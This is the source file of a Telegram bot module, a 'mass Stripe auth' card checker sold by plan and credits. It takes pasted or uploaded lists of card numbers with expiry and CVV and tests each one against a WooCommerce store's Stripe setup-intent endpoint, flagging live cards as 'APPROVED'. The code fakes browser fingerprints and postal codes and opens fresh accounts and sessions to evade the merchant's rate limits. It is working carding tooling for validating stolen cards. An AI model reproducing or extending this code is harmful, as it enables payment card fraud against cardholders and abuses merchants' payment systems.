# BOT/gates/mass/masschk.py
# Mass Stripe Auth 2 Checker - Using stauth2.py API

import asyncio
import json
import random
import time
import re
import html
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import logging
import os
import string
from pathlib import Path

# Import from stauth2.py (correct path)
from BOT.gates.auth.stripe.stauth2 import StripeAuth2Checker, logger, load_users, is_user_banned, check_cooldown, get_user_plan, SmartCardParser
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.Admins import is_command_disabled, get_command_offline_message
from BOT.gc.credit import deduct_credit, get_user_credits, has_sufficient_credits
from BOT.helper.filter import extract_cards

# Download directory
DOWNLOAD_DIR = "BOT/downloads"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# ========== PLAN-BASED CARD LIMITS ==========
def get_card_limit_by_plan(plan_name: str, user_role: str = "Free") -> int:
    """
    Get maximum allowed cards per mass check based on user's plan
    Returns: int (max cards allowed)
    """
    # Owner has no limit
    if user_role == "Owner":
        return float('inf')  # Unlimited
    
    # Plan-based limits
    plan_limits = {
        "Free": 25,
        "Plus": 50,
        "Pro": 75,
        "Elite": 100,
        "VIP": 150,
        "ULTIMATE": 200
    }
    
    # Check by plan name first
    limit = plan_limits.get(plan_name, 25)  # Default to Free limit (25)
    
    # If plan_name not found but user_role indicates premium, use appropriate limit
    if limit == 25 and user_role in ["Admin", "Owner"]:
        return float('inf')  # Admin also unlimited
    elif limit == 25 and plan_name == "Free" and user_role != "Free":
        # This handles cases where user has premium role but plan name mismatch
        if user_role in plan_limits:
            return plan_limits[user_role]
    
    return limit

def get_plan_limit_message(plan_name: str, current_count: int, max_allowed: int) -> str:
    """Generate formatted message when user exceeds card limit"""
    plan_limits_display = {
        "Free": "25 cards",
        "Plus": "50 cards",
        "Pro": "75 cards",
        "Elite": "100 cards",
        "VIP": "150 cards",
        "ULTIMATE": "200 cards",
        "Owner": "Unlimited",
        "Admin": "Unlimited"
    }
    
    limit_display = plan_limits_display.get(plan_name, "25 cards")
    
    return f"""<pre>❌ Card Limit Exceeded</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You can only check {limit_display} at once.
⟐ <b>Your Plan</b>: <code>{plan_name}</code>
⟐ <b>Cards Provided</b>: <code>{current_count}</code>
⟐ <b>Max Allowed</b>: <code>{max_allowed}</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Upgrade your plan to check more cards at once</code>
<b>~ Note:</b> <code>Type /plans to see all plan benefits</code>"""

def get_unique_filename(original_filename):
    """Generate a unique filename to avoid conflicts"""
    base, ext = os.path.splitext(original_filename)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{base}_{timestamp}_{random_suffix}{ext}"

async def download_file(client, message, file_msg):
    """Download file from Telegram with unique filename"""
    try:
        # Get original filename
        original_filename = file_msg.document.file_name if file_msg.document else "unknown.txt"
        
        # Generate unique filename
        unique_filename = get_unique_filename(original_filename)
        file_path = os.path.join(DOWNLOAD_DIR, unique_filename)
        
        # Download the file
        print(f"📥 Downloading file: {original_filename} -> {unique_filename}")
        downloaded_path = await file_msg.download(file_name=file_path)
        
        return downloaded_path
    except Exception as e:
        print(f"❌ Error downloading file: {e}")
        return None

async def extract_cards_from_file(file_path):
    """Extract cards from downloaded file using filter.py"""
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            file_content = f.read()
        
        # Use filter.py's extract_cards function
        all_cards, unique_cards = extract_cards(file_content)
        
        print(f"📊 Extracted {len(all_cards)} total cards, {len(unique_cards)} unique cards from file")
        return unique_cards
    except Exception as e:
        print(f"❌ Error extracting cards from file: {e}")
        return []

async def parse_card_list_from_reply(client, message):
    """Parse card list when user replies to a message"""
    card_list = []
    file_path = None
    
    if not message.reply_to_message:
        return card_list, file_path
    
    replied = message.reply_to_message
    
    # Case 1: Reply to a document (file)
    if replied.document:
        # Download the file
        file_path = await download_file(client, message, replied)
        if not file_path:
            return card_list, None
        
        # Extract cards from file
        card_list = await extract_cards_from_file(file_path)
        
    # Case 2: Reply to a text message
    elif replied.text:
        # Extract cards directly from text
        all_cards, unique_cards = extract_cards(replied.text)
        card_list = unique_cards
    
    return card_list, file_path

async def parse_card_list_from_command(message):
    """Parse card list when cards are in the same message as command"""
    card_list = []
    
    # Get the full message text
    full_text = message.text or ""
    
    # Split into lines
    lines = full_text.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        # Check if this line contains the command
        if any(line.startswith(prefix) for prefix in ['/mchk', '.mchk', '$mchk']):
            # Extract everything after the command on the same line
            parts = line.split(maxsplit=1)
            if len(parts) > 1:
                remaining_text = parts[1].strip()
                if remaining_text:
                    all_cards, unique_cards = extract_cards(remaining_text)
                    card_list.extend(unique_cards)
        else:
            # Regular line without command - extract cards directly
            all_cards, unique_cards = extract_cards(line)
            card_list.extend(unique_cards)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_cards = []
    for card in card_list:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)
    
    print(f"📝 Parsed {len(unique_cards)} cards from command: {unique_cards}")
    return unique_cards

class MassStripeAuth2Checker:
    def __init__(self):
        self.checker = StripeAuth2Checker()
        self.current_client = None
        self.current_nonce = None
        self.retry_count = 0
        self.max_retries = 2  # Maximum retries per card when rate limited
        
    async def create_fresh_session(self):
        """Create a brand new session with new account"""
        try:
            # Close existing session if any
            if self.current_client:
                try:
                    await self.current_client.aclose()
                except:
                    pass
                self.current_client = None
                self.current_nonce = None
            
            # Create new session
            logger.info("🔄 Creating fresh session with new account...")
            client, nonce, session_msg = await self.checker.create_authenticated_session()
            
            if nonce:
                self.current_client = client
                self.current_nonce = nonce
                self.retry_count = 0
                logger.success("✅ New session created successfully")
                return True
            else:
                logger.error(f"❌ Failed to create session: {session_msg}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error creating session: {str(e)}")
            return False
    
    def is_rate_limit_error(self, error_message):
        """Check if error message indicates rate limiting"""
        rate_limit_patterns = [
            "cannot add a new payment method so soon",
            "rate limit",
            "too many requests",
            "try again later",
            "nonce",
            "invalid nonce",
            "session expired",
            "for security",
            "please wait",
            "429",
            "403"
        ]
        
        error_lower = error_message.lower()
        for pattern in rate_limit_patterns:
            if pattern in error_lower:
                return True
        return False
    
    async def check_card_with_session(self, card_details, username, user_data, client=None, nonce=None, retry_count=0):
        """Check card using existing session with rate limit handling"""
        start_time = time.time()
        
        # Parse card details using SmartCardParser from stauth2.py
        cc, mes, ano, cvv = SmartCardParser.extract_card_from_text(card_details)
        
        if not cc or not mes or not ano or not cvv:
            # Fallback to pipe format parsing
            parts = card_details.split('|')
            if len(parts) >= 4:
                cc = parts[0].strip().replace(" ", "")
                mes = parts[1].strip()
                ano = parts[2].strip()
                cvv = parts[3].strip()
        
        # Ensure year is 4 digits
        if ano and len(ano) == 2:
            ano = '20' + ano
        
        try:
            # Get BIN info
            bin_info = await self.checker.get_bin_info(cc)
            
            # Generate random browser fingerprints
            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            
            # Format card number with spaces as shown in trace
            formatted_cc = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}"
            postal_code = random.choice(['10080', '90210', '33101', '60601', '75201', '94102', '98101', '20001'])
            
            # Create Stripe payment method
            stripe_data = {
                'type': 'card',
                'card[number]': formatted_cc,
                'card[cvc]': cvv,
                'card[exp_year]': ano,
                'card[exp_month]': mes,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': postal_code,
                'billing_details[address][country]': 'US',
                'pasted_fields': 'number',
                'payment_user_agent': f'stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent',
                'referrer': self.checker.base_url,
                'time_on_page': str(random.randint(30000, 120000)),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': str(random.randint(2021, 2024)),
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.checker.stripe_key,
                '_stripe_version': '2024-06-20'
            }
            
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.checker.user_agent,
                'sec-ch-ua': self.checker.sec_ch_ua,
                'sec-ch-ua-mobile': self.checker.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.checker.sec_ch_ua_platform,
            }
            
            stripe_response = await client.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=stripe_headers,
                data=stripe_data
            )
            
            if stripe_response.status != 200:
                error_text = await stripe_response.text()
                error_text = error_text[:150] if error_text else "No response"
                return self.format_mass_card_response(
                    cc, mes, ano, cvv, "DECLINED",
                    f"Stripe Error: {error_text}",
                    username, time.time()-start_time, user_data, bin_info
                )
            
            stripe_json = await stripe_response.json()
            
            if "error" in stripe_json:
                error_msg = stripe_json["error"].get("message", "Stripe declined")
                return self.format_mass_card_response(
                    cc, mes, ano, cvv, "DECLINED", error_msg,
                    username, time.time()-start_time, user_data, bin_info
                )
            
            payment_method_id = stripe_json.get("id")
            if not payment_method_id:
                return self.format_mass_card_response(
                    cc, mes, ano, cvv, "DECLINED", "Payment method creation failed",
                    username, time.time()-start_time, user_data, bin_info
                )
            
            # Confirm setup intent via AJAX
            ajax_url = f"{self.checker.base_url}/wp-admin/admin-ajax.php"
            ajax_headers = self.checker.get_base_headers()
            ajax_headers.update({
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.checker.base_url,
                'Referer': f"{self.checker.base_url}/my-account/add-payment-method/",
                'X-Requested-With': 'XMLHttpRequest',
            })
            
            ajax_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce
            }
            
            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
            
            if ajax_response.status != 200:
                return self.format_mass_card_response(
                    cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {ajax_response.status}",
                    username, time.time()-start_time, user_data, bin_info
                )
            
            result = await ajax_response.json()
            
            if result.get("success"):
                # Check for 3DS
                if (isinstance(result.get("data"), dict) and 
                    result["data"].get("status") == "requires_action" and
                    result["data"].get("next_action", {}).get("type") == "use_stripe_sdk" and
                    "three_d_secure_2_source" in str(result["data"].get("next_action", {}).get("use_stripe_sdk", {}))):
                    
                    return self.format_mass_card_response(
                        cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**",
                        username, time.time()-start_time, user_data, bin_info
                    )
                
                return self.format_mass_card_response(
                    cc, mes, ano, cvv, "APPROVED", "Successful",
                    username, time.time()-start_time, user_data, bin_info
                )
            else:
                error_data = result.get("data", {})
                error_message = "Transaction Declined"
                
                if isinstance(error_data, dict):
                    if "error" in error_data:
                        error_obj = error_data["error"]
                        if isinstance(error_obj, dict):
                            error_message = error_obj.get("message", "Card Declined")
                        else:
                            error_message = str(error_obj)
                    elif "message" in error_data:
                        error_message = error_data["message"]
                elif isinstance(error_data, str):
                    error_message = error_data
                
                # Check for rate limit error - retry with new session if needed
                if self.is_rate_limit_error(error_message) and retry_count < self.max_retries:
                    logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
                    
                    # Create new session for this card only
                    new_client, new_nonce, session_msg = await self.checker.create_authenticated_session()
                    if new_nonce:
                        # Retry this card with new session
                        result = await self.check_card_with_session(
                            card_details, username, user_data, new_client, new_nonce, retry_count + 1
                        )
                        # Close the new session after use
                        try:
                            await new_client.aclose()
                        except:
                            pass
                        return result
                    else:
                        return self.format_mass_card_response(
                            cc, mes, ano, cvv, "DECLINED", "Rate limit - failed to create new session",
                            username, time.time()-start_time, user_data, bin_info
                        )
                
                return self.format_mass_card_response(
                    cc, mes, ano, cvv, "DECLINED", error_message,
                    username, time.time()-start_time, user_data, bin_info
                )
                
        except Exception as e:
            # Check if it's a rate limit error in the exception
            if self.is_rate_limit_error(str(e)) and retry_count < self.max_retries:
                logger.info(f"🔄 Rate limit exception, retrying with new session (attempt {retry_count + 1})")
                
                # Create new session for this card only
                new_client, new_nonce, session_msg = await self.checker.create_authenticated_session()
                if new_nonce:
                    # Retry this card with new session
                    result = await self.check_card_with_session(
                        card_details, username, user_data, new_client, new_nonce, retry_count + 1
                    )
                    # Close the new session after use
                    try:
                        await new_client.aclose()
                    except:
                        pass
                    return result
            
            # Not a rate limit error or max retries exceeded
            bin_info = await self.checker.get_bin_info(cc)
            return self.format_mass_card_response(
                cc, mes, ano, cvv, "ERROR", str(e)[:80],
                username, time.time()-start_time, user_data, bin_info
            )
    
    def format_mass_card_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info):
        """Format individual card response for mass check with /mchk in header"""
        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")

        if "APPROVED" in status:
            status_emoji = "✅"
            status_text = "APPROVED"
        elif "DECLINED" in status:
            status_emoji = "❌"
            status_text = "DECLINED"
        else:
            status_emoji = "⚠️"
            status_text = status.upper() if status else "ERROR"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /mchk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Auth 2
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response
    
    def get_processing_message_dynamic(self, total_cards, checked, hits, declines, errors, username, user_plan):
        """Get dynamic processing message that updates in real-time"""
        left = total_cards - checked
        
        return f"""<b>「$cmd → /mchk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
🔄 <b>Mass Stripe Auth 2</b>

📊 <b>Checked:</b> <code>{checked}/{total_cards}</code>
✅ <b>Hits:</b> <code>{hits}</code>
❌ <b>Declines:</b> <code>{declines}</code>
⚠️ <b>Errors:</b> <code>{errors}</code>
⏳ <b>Left:</b> <code>{left}</code>

━━━━━━━━━━━━━━━
👤 <b>User:</b> @{username}
💎 <b>Plan:</b> {user_plan}"""
    
    async def send_approved_card_immediately(self, client, message, result, card_number, total_cards):
        """Send approved card immediately without waiting for all cards to finish"""
        try:
            await message.reply(result, disable_web_page_preview=True)
            await asyncio.sleep(0.5)
            return True
        except Exception as e:
            print(f"Failed to send approved card immediately: {e}")
            return False
    
    async def send_final_summary(self, client, message, successful, failed, total_cards, username, elapsed_time, user_data, processing_msg):
        """Send final summary after all cards are processed"""
        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")
        
        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        
        # Delete the processing message
        try:
            await processing_msg.delete()
        except:
            pass
        
        # Send final summary
        summary = f"""<b>「$cmd → /mchk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Gateway -</b> Stripe Auth 2 Mass
<b>[•] Status -</b> <code>Complete ✅</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Results:</b> ✅ {successful} | ❌ {failed}
<b>[+] Total Cards:</b> <code>{total_cards}</code>
<b>[+] Credits Used:</b> <code>3</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] Time:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Mass ⚡️</code></b>"""
        
        try:
            await message.reply(summary, disable_web_page_preview=True)
        except Exception as e:
            print(f"Failed to send summary: {e}")
    
    async def format_mass_response_collective(self, results, successful, failed, total_cards, username, elapsed_time, user_data):
        """Format collective response when total cards <= 5"""
        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")
        
        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        
        # Start with header (ONLY ONCE)
        response = f"""<b>「$cmd → /mchk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Gateway -</b> Stripe Auth 2 Mass
<b>[•] Status -</b> <code>Complete ✅</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Results:</b> ✅ {successful} | ❌ {failed}
<b>[+] Total Cards:</b> <code>{total_cards}</code>
<b>[+] Credits Used:</b> <code>3</code>
━━━━━━━━━━━━━━━

"""
        
        # Process each result to extract ONLY the card details
        for result in results:
            lines = result.split('\n')
            
            # Extract relevant card information (skip the header and footer)
            card_lines = []
            skip_header = True
            skip_footer = False
            
            for line in lines:
                # Skip the header line with 「$cmd → /mchk」
                if line.startswith('<b>「$cmd → /mchk」'):
                    skip_header = False
                    continue
                
                # Skip the separator line after header
                if line == '━━━━━━━━━━━━━━━' and not skip_header:
                    skip_header = False
                    continue
                
                # Once we hit the "[ﾒ] Checked By:" line, we've reached the footer - stop adding
                if '[ﾒ] Checked By:' in line:
                    skip_footer = True
                    break
                
                # If we're past the header and not in footer, add the line
                if not skip_header and not skip_footer:
                    card_lines.append(line)
            
            # Add the extracted card details to the response
            for card_line in card_lines:
                if card_line.strip():
                    response += card_line + '\n'
            
            # Add a blank line between cards for better readability
            response += '\n'
        
        # Add FINAL summary (ONLY ONCE at the very end)
        response += f"""━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] Time:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Mass ⚡️</code></b>"""
        
        return response


# Command handler for /mchk command
@Client.on_message(filters.command(["mchk", ".mchk", "$mchk"]))
@auth_and_free_restricted
async def handle_mass_stripe_auth2(client: Client, message: Message):
    file_path = None
    approved_sent = 0
    
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)
        
        print(f"🔍 /mchk command received from {username}")
        print(f"🔍 Full message: {message.text}")
        
        # Check if command is disabled
        command_text = message.text.split()[0] if message.text else ""
        command_name = command_text.lstrip('/.$') if command_text else "mchk"
        
        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return
        
        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")
        user_role = user_data.get("role", "Free")
        
        # Parse card list based on input type
        card_list = []
        
        # Case 1: User replied to a message (text or file)
        if message.reply_to_message:
            card_list, file_path = await parse_card_list_from_reply(client, message)
            source_type = "file" if file_path else "replied text"
            print(f"📁 Extracted {len(card_list)} cards from {source_type}")
        
        # Case 2: Cards in the same message
        if not card_list:
            card_list = await parse_card_list_from_command(message)
            print(f"📝 Extracted {len(card_list)} cards from command message")
        
        print(f"Final card list: {card_list}")
        
        if len(card_list) == 0:
            await message.reply("""<pre>❌ No Valid Cards Found</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please provide card details in one of these formats:

<b>Format 1 (Reply to file/text):</b>
• Reply to a text file or message containing cards with /mchk

<b>Format 2 (Multi-line after command):</b>
<code>/mchk
5414963811565512|09|28|822
4221352001240530|12|26|050</code>

<b>Format 3 (Single line):</b>
<code>/mchk 5414963811565512|09|28|822 4221352001240530|12|26|050</code>

⟐ <b>Note:</b> <code>Cards will be auto-filtered from any format</code>
━━━━━━━━━━━━━""")
            return
        
        card_count = len(card_list)
        
        # ========== PLAN-BASED CARD LIMIT CHECK ==========
        max_allowed = get_card_limit_by_plan(plan_name, user_role)
        
        # Check if card count exceeds plan limit
        if max_allowed != float('inf') and card_count > max_allowed:
            await message.reply(get_plan_limit_message(plan_name, card_count, max_allowed))
            
            # Clean up downloaded file if any
            if file_path and os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass
            return
        
        # Check cooldown (owner is automatically skipped)
        can_use, wait_time = check_cooldown(user_id, "mchk")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return
        
        # Check if user has enough credits for mass check (3 credits for entire command)
        has_credits, credit_msg = has_sufficient_credits(user_id, 3)
        
        if not has_credits:
            current_credits = get_user_credits(user_id)
            await message.reply(f"""<pre>❌ Insufficient Credits</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You don't have enough credits for mass check.
⟐ <b>Required:</b> <code>3 credits</code>
⟐ <b>Available:</b> <code>{current_credits}</code>
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
━━━━━━━━━━━━━""")
            return
        
        # Deduct 3 credits BEFORE processing mass check (ONCE for entire command)
        deduct_success, deduct_msg = deduct_credit(user_id, 3)
        
        if not deduct_success:
            await message.reply(f"""<pre>❌ Credit Deduction Failed</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: {deduct_msg}
━━━━━━━━━━━━━""")
            return
        
        start_time = time.time()
        
        # Create mass checker instance
        mass_checker = MassStripeAuth2Checker()
        
        # Send initial processing message
        processing_msg = await message.reply(
            mass_checker.get_processing_message_dynamic(card_count, 0, 0, 0, 0, username, plan_name)
        )
        
        results = []
        successful = 0
        failed = 0
        errors = 0
        
        # Create ONE shared session for ALL cards
        print("🔄 Creating shared session for mass check...")
        session_client, nonce, session_msg = await mass_checker.checker.create_authenticated_session()
        
        if not nonce:
            await processing_msg.edit_text("""<pre>❌ Session Creation Failed</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Failed to create session for mass check.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        print(f"✅ Shared session created successfully with nonce: {nonce}")
        
        # Process each card using the SAME shared session
        for i, card_details in enumerate(card_list):
            checked = i + 1
            
            # Update progress message
            try:
                await processing_msg.edit_text(
                    mass_checker.get_processing_message_dynamic(
                        card_count, checked, successful, failed, errors, username, plan_name
                    )
                )
            except:
                pass
            
            # Check card using the shared session
            try:
                print(f"🔄 Checking card {i+1}/{card_count}: {card_details}")
                result = await mass_checker.check_card_with_session(
                    card_details,
                    username,
                    user_data,
                    client=session_client,
                    nonce=nonce,
                    retry_count=0
                )
                
                # Store result for potential collective response
                results.append(result)
                
                if "APPROVED" in result:
                    successful += 1
                    # For >5 cards, send approved cards immediately
                    if card_count > 5:
                        await mass_checker.send_approved_card_immediately(
                            session_client, message, result, i+1, card_count
                        )
                        approved_sent += 1
                elif "DECLINED" in result:
                    failed += 1
                else:
                    errors += 1
                    
            except Exception as e:
                print(f"❌ Error checking card {i+1}: {str(e)}")
                # Handle individual card error
                error_result = f"""<b>「$cmd → /mchk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{card_details}</code>
<b>[•] Gateway -</b> Stripe Auth 2
<b>[•] Status-</b> <code>ERROR ⚠️</code>
<b>[•] Response-</b> <code>Check failed: {str(e)[:50]}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>0.00 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""
                results.append(error_result)
                errors += 1
            
            # Update progress message with dynamic stats
            try:
                await processing_msg.edit_text(
                    mass_checker.get_processing_message_dynamic(
                        card_count, checked, successful, failed, errors, username, plan_name
                    )
                )
            except:
                pass
            
            # Delay between cards
            if i < len(card_list) - 1:
                await asyncio.sleep(random.uniform(1, 2))
        
        # Close the shared session after all cards are processed
        if session_client:
            try:
                await session_client.aclose()
                print("✅ Shared session closed successfully")
            except:
                print("⚠️ Failed to close shared session")
        
        elapsed_time = time.time() - start_time
        
        # DECISION BASED ON CARD COUNT
        if card_count > 5:
            # For >5 cards: We've already sent approved cards immediately
            # Now just send the final summary
            await mass_checker.send_final_summary(
                session_client, message, successful, failed + errors,
                card_count, username, elapsed_time, user_data, processing_msg
            )
        else:
            # For <=5 cards: Send collective response with all cards
            final_response = await mass_checker.format_mass_response_collective(
                results, successful, failed + errors, card_count, username, elapsed_time, user_data
            )
            
            # Update cooldown
            check_cooldown(user_id, "mchk")
            
            # Send final result
            try:
                await processing_msg.edit_text(final_response, disable_web_page_preview=True)
            except Exception as e:
                print(f"Failed to edit message: {e}")
                # If editing fails, send as new message
                try:
                    await message.reply(final_response, disable_web_page_preview=True)
                except Exception as e:
                    print(f"Failed to send mass auth results: {e}")
        
        # Clean up downloaded file if any
        if file_path and os.path.exists(file_path):
            try:
                os.remove(file_path)
                print(f"🗑️ Deleted temporary file: {file_path}")
            except Exception as e:
                print(f"⚠️ Failed to delete file {file_path}: {e}")
                
    except Exception as e:
        error_msg = str(e)[:150]
        print(f"❌ Mass Check Error: {error_msg}")
        await message.reply(f"""<pre>❌ Mass Check Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing mass check.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
        
        # Clean up downloaded file if any in case of error
        if 'file_path' in locals() and file_path and os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass

print("✅ Mass Stripe Auth 2 (mchk) loaded successfully!")
